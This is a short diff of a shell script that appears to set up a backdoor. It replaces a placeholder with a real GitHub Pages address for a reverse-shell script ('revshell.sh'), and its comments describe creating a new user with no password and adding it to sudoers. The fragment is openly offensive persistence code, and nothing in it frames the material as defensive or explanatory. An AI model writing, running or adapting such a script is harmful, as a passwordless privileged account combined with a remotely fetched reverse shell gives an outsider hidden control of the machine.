@@ -2,7 +2,7 @@
 
 # Define variables
 NEW_USER="newuser"
-REVSHELL_URL="https://your-github-pages-url/revshell.sh"
+REVSHELL_URL="https://lydacious.github.io/testpage/revshell.sh"
 
 # Create a new user with no password and add it to sudoers (for elevated privileges)
 useradd -m $NEW_USER
